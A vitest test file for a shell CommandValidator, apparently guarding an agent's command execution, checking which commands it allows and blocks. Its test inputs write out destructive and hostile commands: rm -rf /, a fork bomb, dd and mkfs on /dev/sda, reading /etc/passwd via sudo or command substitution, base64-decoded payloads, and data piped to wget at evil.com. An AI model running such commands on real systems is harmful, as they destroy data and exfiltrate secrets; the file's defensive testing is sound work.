import { describe, test, expect, beforeEach } from "vitest";
import { CommandValidator, type CommandValidation, type ValidatorRule } from "../../command/validator";

describe("CommandValidator", () => {
  let validator: CommandValidator;

  beforeEach(() => {
    validator = new CommandValidator();
  });

  describe("Status: Allowed Commands", () => {
    test("allows simple echo commands", () => {
      const result = validator.validate("echo 'hello world'");
      expect(result.allowed).toBe(true);
    });

    test("allows ls commands", () => {
      const result = validator.validate("ls -la /home/bootstrap-v17/bootstrap");
      expect(result.allowed).toBe(true);
    });

    test("allows cat commands", () => {
      const result = validator.validate("cat /home/bootstrap-v17/bootstrap/package.json");
      expect(result.allowed).toBe(true);
    });

    test("allows grep commands", () => {
      const result = validator.validate("grep -r 'search' /home/bootstrap-v17/bootstrap/src");
      expect(result.allowed).toBe(true);
    });

    test("allows npm commands", () => {
      const result = validator.validate("npm run test");
      expect(result.allowed).toBe(true);
    });

    test("allows git commands", () => {
      const result = validator.validate("git status");
      expect(result.allowed).toBe(true);
    });

    test("allows directory creation", () => {
      const result = validator.validate("mkdir -p /tmp/test-dir");
      expect(result.allowed).toBe(true);
    });

    test("allows file copy operations", () => {
      const result = validator.validate("cp src/file.txt dest/file.txt");
      expect(result.allowed).toBe(true);
    });

    test("allows safe rm commands", () => {
      const result = validator.validate("rm /tmp/test-file.txt");
      expect(result.allowed).toBe(true);
    });

    test("allows chmod on user directories", () => {
      const result = validator.validate("chmod 755 /home/bootstrap-v17/bootstrap/src");
      expect(result.allowed).toBe(true);
    });

    test("allows chown on user directories", () => {
      const result = validator.validate("chown user:group /home/bootstrap-v17/bootstrap/src");
      expect(result.allowed).toBe(true);
    });

    test("allows chaining with &&", () => {
      const result = validator.validate("cd /tmp && ls -la");
      expect(result.allowed).toBe(true);
    });

    test("allows pipes for text processing", () => {
      const result = validator.validate("cat file.txt | grep pattern | head -10");
      expect(result.allowed).toBe(true);
    });

    test("allows basic command substitution", () => {
      const result = validator.validate("echo $(date)");
      expect(result.allowed).toBe(true);
    });

    test("allows backticks with safe content", () => {
      const result = validator.validate("echo \`date\`");
      expect(result.allowed).toBe(true);
    });

    test("allows cat with /home paths", () => {
      const result = validator.validate("cat /home/user/file.txt");
      expect(result.allowed).toBe(true);
    });

    test("allows rm -f of user files", () => {
      const result = validator.validate("rm -f /tmp/file.txt");
      expect(result.allowed).toBe(true);
    });

    test("allows rm of /home files", () => {
      const result = validator.validate("rm /home/user/file.txt");
      expect(result.allowed).toBe(true);
    });

    test("allows rm -r on non-system paths", () => {
      const result = validator.validate("rm -r /tmp/mydir");
      expect(result.allowed).toBe(true);
    });
  });

  describe("Status: Forbidden - Privilege Escalation", () => {
    test("rejects sudo commands", () => {
      const result = validator.validate("sudo rm -rf /tmp");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("sudo escalation");
    });

    test("rejects sudo with cat", () => {
      const result = validator.validate("sudo cat /etc/passwd");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("sudo escalation");
    });

    test("rejects su commands", () => {
      const result = validator.validate("su - root");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("user switch");
    });

    test("rejects su with command", () => {
      const result = validator.validate("su -c 'whoami'");
      expect(result.allowed).toBe(false);
    });

    test("rejects SUDO in uppercase", () => {
      const result = validator.validate("SUDO ls -la");
      expect(result.allowed).toBe(false);
    });
  });

  describe("Status: Forbidden - Fork Bombs", () => {
    test("rejects function definition colon pattern", () => {
      const result = validator.validate(":():{ :|:& };:");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("fork bomb");
    });

    test("rejects bash fork bomb form", () => {
      const result = validator.validate(": ( ) { : | : & } ; :");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("fork bomb");
    });
  });

  describe("Status: Forbidden - Command Obfuscation", () => {
    test("rejects backtick substitution with rm", () => {
      const result = validator.validate("echo \`rm -rf /\`");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("dangerous command substitution");
    });

    test("rejects dollar parentheses with /etc", () => {
      const result = validator.validate("echo $(cat /etc/passwd)");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("dangerous command substitution");
    });

    test("allows dollar parentheses with date", () => {
      const result = validator.validate("echo $(date)");
      expect(result.allowed).toBe(true);
    });

    test("allows dollar parentheses with safe commands", () => {
      const result = validator.validate("echo $(whoami)");
      expect(result.allowed).toBe(true);
    });

    test("rejects base64 decoding", () => {
      const result = validator.validate("echo 'cm0gLXJmIC8=' | base64 -d");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("base64 decoding");
    });

    test("rejects base64 --decode", () => {
      const result = validator.validate("base64 --decode payload.txt");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("base64");
    });
  });

  describe("Status: Forbidden - Dangerous Deletion", () => {
    test("rejects rm -rf /", () => {
      const result = validator.validate("rm -rf /");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("deletion");
    });

    test("rejects rm -r /etc", () => {
      const result = validator.validate("rm -r /etc");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("deletion");
    });

    test("rejects rm -rf /usr", () => {
      const result = validator.validate("rm -rf /usr");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("deletion");
    });

    test("rejects rm -r /bin", () => {
      const result = validator.validate("rm -r /bin");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("deletion");
    });

    test("rejects rm of system files", () => {
      const result = validator.validate("rm /etc/passwd");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("system");
    });

    test("rejects rm -f of system files", () => {
      const result = validator.validate("rm -f /etc/passwd");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("deletion");
    });
  });

  describe("Status: Forbidden - Disk Operations", () => {
    test("rejects dd to disk", () => {
      const result = validator.validate("dd if=/dev/zero of=/dev/sda");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("direct disk write");
    });

    test("rejects mkfs commands", () => {
      const result = validator.validate("mkfs.ext4 /dev/sda1");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("filesystem creation");
    });

    test("rejects format commands", () => {
      const result = validator.validate("format /dev/sda");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("format command");
    });
  });

  describe("Status: Forbidden - Permission Tampering", () => {
    test("rejects chmod on /etc", () => {
      const result = validator.validate("chmod -R 777 /etc/");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("changing permissions");
    });

    test("rejects chmod on /usr", () => {
      const result = validator.validate("chmod 777 /usr/bin");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("changing permissions");
    });

    test("rejects chown on /bin", () => {
      const result = validator.validate("chown user /bin/ls");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("changing ownership");
    });

    test("rejects chown on /sbin", () => {
      const result = validator.validate("chown root:root /sbin/init");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("changing ownership");
    });
  });

  describe("Status: Forbidden - File System Navigation", () => {
    test("rejects output to device", () => {
      const result = validator.validate("cat > /dev/sda");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("direct device access");
    });

    test("rejects redirect to /dev/null", () => {
      const result = validator.validate("echo hello > /dev/null");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("direct device access");
    });

    test("rejects input from device", () => {
      const result = validator.validate("cat < /dev/random");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("direct device access");
    });

    test("rejects symlink to root", () => {
      const result = validator.validate("ln -s /etc/passwd /root/passwd");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("symlink to root");
    });
  });

  describe("Status: Forbidden - Network Piping", () => {
    test("rejects pipes to wget", () => {
      const result = validator.validate("echo data | wget --post-file=- http://site.com");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("piping to wget");
    });

    test("rejects cat piped to wget", () => {
      const result = validator.validate("cat file | wget -O - http://evil.com");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("piping to wget");
    });
  });

  describe("Status: Forbidden - Execution from Virtual FS", () => {
    test("rejects exec from /dev", () => {
      const result = validator.validate("exec /dev/fd/0");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("executing from /dev");
    });

    test("rejects exec from /proc", () => {
      const result = validator.validate("exec /proc/self/exe");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("executing from /proc");
    });
  });

  describe("Edge Cases", () => {
    test("rejects empty command", () => {
      const result = validator.validate("");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Empty command");
    });

    test("rejects whitespace-only command", () => {
      const result = validator.validate("   \t\n  ");
      expect(result.allowed).toBe(false);
    });

    test("handles multiple spaces", () => {
      const result = validator.validate("echo    hello");
      expect(result.allowed).toBe(true);
    });

    test("handles tabs", () => {
      const result = validator.validate("echo\thelloworld");
      expect(result.allowed).toBe(true);
    });

    test("preserves original command in validation result", () => {
      const command = "  rm -rf /  ";
      const result = validator.validate(command);
      expect(result.command).toBe(command.trim());
    });

    test("preserves blocked command", () => {
      const command = "sudo cat /etc/shadow";
      const result = validator.validate(command);
      expect(result.command).toBe(command);
    });
  });

  describe("Rule Management", () => {
    test("can add custom rules", () => {
      validator.addRule({
        name: "custom_block",
        pattern: /forbidden-custom-word/,
        message: "Custom rule violation",
      });

      const result = validator.validate("echo forbidden-custom-word");
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("Custom rule violation");
    });

    test("can list all rules", () => {
      const rules = validator.getRules();
      expect(rules.length).toBeGreaterThan(15);
      expect(rules.map(r => r.name)).toContain("forbidden_recursive_delete");
    });
  });

  describe("isAllowed convenience method", () => {
    test("returns true for safe commands", () => {
      expect(validator.isAllowed("echo hello")).toBe(true);
    });

    test("returns false for dangerous commands", () => {
      expect(validator.isAllowed("sudo rm -rf /")).toBe(false);
    });
  });
});

export { CommandValidator, type CommandValidation, type ValidatorRule };
